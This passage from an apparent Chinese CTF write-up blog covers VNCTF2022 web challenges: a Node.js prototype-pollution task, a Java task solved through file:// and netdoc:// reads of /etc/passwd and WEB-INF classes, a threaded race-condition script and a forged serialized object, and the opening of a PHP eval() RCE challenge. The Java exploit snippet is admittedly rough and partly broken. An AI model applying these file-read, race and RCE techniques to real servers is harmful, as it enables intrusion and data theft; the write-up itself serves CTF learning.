class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>k <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">delete</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/source"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> p <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>path <span class="token operator">||</span> <span class="token string">"/src/index.js"</span><span class="token punctuation">;</span>  p <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>PORT <span class="token operator">||</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>分析</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>k <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">delete</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>猜测是要利用原链型污染更改.prototype，不过我自己没有想出来payload，对原链型污染的理解还不够深，希望之后找几道习题练一练<br>参考：<br><a href="https://www.cnblogs.com/l0nmar/p/13951739.html">https://www.cnblogs.com/l0nmar/p/13951739.html</a><br><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto</a>__<br><a href="https://xz.aliyun.com/t/2802">https://xz.aliyun.com/t/2802</a><br><a href="https://xz.aliyun.com/t/2735">https://xz.aliyun.com/t/2735</a></p><h2 id="easyJ4va"><a href="#easyJ4va" class="headerlink" title="easyJ4va"></a>easyJ4va</h2><h3 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="jd-gui反编译-class文件"><a href="#jd-gui反编译-class文件" class="headerlink" title="jd-gui反编译.class文件"></a>jd-gui反编译.class文件</h4><p><a href="https://github.com/java-decompiler/jd-gui/releases">下载地址</a><br>命令行调用图形化界面，正常使用。</p><pre class=" language-1"><code class="language-1">java -jar jd-jui-1.6.6.jar</code></pre><h4 id="tomact目录"><a href="#tomact目录" class="headerlink" title="tomact目录"></a>tomact目录</h4><p><a href="https://riptutorial.com/tomcat/example/20892/directory-structure-in-ubuntu--linux-">tomcat目录结构</a></p><h4 id="java基础语法"><a href="#java基础语法" class="headerlink" title="java基础语法"></a>java基础语法</h4><p>之后填坑</p><h3 id="题目详解-2"><a href="#题目详解-2" class="headerlink" title="题目详解"></a>题目详解</h3><p>打开题目F12提示/file?，访问/file，提示要输入url，用file协议读取/etc/passwd</p><pre class=" language-1"><code class="language-1">/file?url=file:///etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologintomcat:x:1000:1000::/home/tomcat:/bin/sh</code></pre><p>构造（WEB-INF文件官方目录里并没有，但访问ROOT之后可以找到。还有不知道官方WP中为什么用netdoc，我复现时用file起到一样的效果）</p><pre class=" language-1"><code class="language-1">/file?url=netdoc:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes</code></pre><p>将其中的.classes文件全部下载。用jd-gui反编译。<br>在HelloWorldServlet.class文件中有</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    String key <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String text <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Secr3t<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> text <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      Base64<span class="token punctuation">.</span>Decoder decoder <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> textByte <span class="token operator">=</span> decoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>      User u <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span>SerAndDe<span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>textByte<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">Response</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">"DeserializeFlag is "</span> <span class="token operator">+</span> Secr3t<span class="token punctuation">.</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token function">Response</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">"KeyError"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p>也就是说我们要得到Secr3t.getKey的值以及useru的反序列化</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"HelloServlet"</span><span class="token punctuation">,</span> urlPatterns <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/evi1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorldServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> <span class="token keyword">volatile</span> String name <span class="token operator">=</span> <span class="token string">"m4n_q1u_666"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">volatile</span> String age <span class="token operator">=</span> <span class="token string">"666"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">volatile</span> String height <span class="token operator">=</span> <span class="token string">"180"</span><span class="token punctuation">;</span>    User user<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>    String reqName <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reqName <span class="token operator">!=</span> null<span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> reqName<span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>Secr3t<span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">Response</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">"no vnctf2022!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>Secr3t<span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">Response</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">"The Key is "</span> <span class="token operator">+</span> Secr3t<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span></code></pre><p>doGet⾥有如下判断，其中有Secr3t判断发现是⽭盾的。需要竞争绕过第⼀个check，并且达到第⼆个check。<br>找到Sect3t.check代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">check</span><span class="token punctuation">(</span>String checkStr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"vnctf2022"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>checkStr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>判断是否含有vnctf2022，需要一个不正确的内容绕过第一个check，然后正确的内容去第二个check。写脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">import</span> sysurl<span class="token operator">=</span><span class="token string">"http://c83209e6-0cdb-4b6c-a822-22faa8342566.node4.buuoj.cn:81/evi1"</span>url1<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?name=vnctf2022"</span>url2<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?name=wrong"</span>event<span class="token operator">=</span>threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"The Key is"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>run<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>run<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>回显：The Key is RGTV8gSETE6LKgj5sq6KKSbuV3nouWdG<br>最后是反序列化，原代码如下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> entity<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>  <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> String age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">transient</span> String height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">User</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> String age<span class="token punctuation">,</span> String height<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span>String age<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>height<span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setHeight</span><span class="token punctuation">(</span>String height<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream s<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">==</span> null<span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> obj<span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">User</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      User user <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span>obj<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> user<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">"User{name='"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span> <span class="token string">", age='"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span> <span class="token string">", height='"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span> <span class="token string">'}'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>写一个与doPost中相反的exp，得到payload。（java语法还不太懂，先写个雏形，之后填坑）</p><pre class=" language-java"><code class="language-java">User u<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"m4n_q1u_666"</span><span class="token punctuation">,</span> <span class="token string">"666"</span><span class="token punctuation">,</span> <span class="token string">"180"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> textByte<span class="token operator">=</span>SerAndDe<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>Base64<span class="token punctuation">.</span>Encoder encoder <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>string text <span class="token operator">=</span> encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>textByte<span class="token punctuation">)</span><span class="token punctuation">;</span>system<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span></code></pre><p>user有个transient修饰的属性height，这是用来声明当前属性不需要反序列化的。注意要写一个与readObject相反的writeObject去强制反序列化。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream s<span class="token punctuation">)</span> <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">{</span>    s<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//强制序列化name</span>    s<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最后把key和base64字符串打进去就行。</p><h2 id="InterestingPHP"><a href="#InterestingPHP" class="headerlink" title="InterestingPHP"></a>InterestingPHP</h2><h3 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h3><h3 id="题目详解-3"><a href="#题目详解-3" class="headerlink" title="题目详解"></a>题目详解</h3><p>进入题目</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><p>是一个RCE注入点，尝试/?exp=var_dump(phpinfo)，回显为NULL，猜测被ban，发现ini_get_all()可以正常运行</p><pre class=" language-1"><code class="language-1">构造：/?exp=var_dump(ini_get_all());回显： array(186) { ["allow_url_fopen"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(4) } ["allow_url_include"]=> array(3) { ["global_value"]=> string(0) "" ["local_value"]=> string(0) "" ["access"]=> int(4) } ["arg_separator.input"]=> array(3) { ["global_value"]=> string(1) "&" ["local_value"]=> string(1) "&" ["access"]=> int(6) } ["arg_separator.output"]=> array(3) { ["global_value"]=> string(1) "&" ["local_value"]=> string(1) "&" ["access"]=> int(7) } ["assert.active"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } ["assert.bail"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["assert.callback"]=> array(3) { ["global_value"]=> NULL ["local_value"]=> NULL ["access"]=> int(7) } ["assert.exception"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["assert.quiet_eval"]=> array(3) { ["global_value"]=> string(1) "0" ["local_value"]=> string(1) "0" ["access"]=> int(7) } ["assert.warning"]=> array(3) { ["global_value"]=> string(1) "1" ["local_value"]=> string(1) "1" ["access"]=> int(7) } 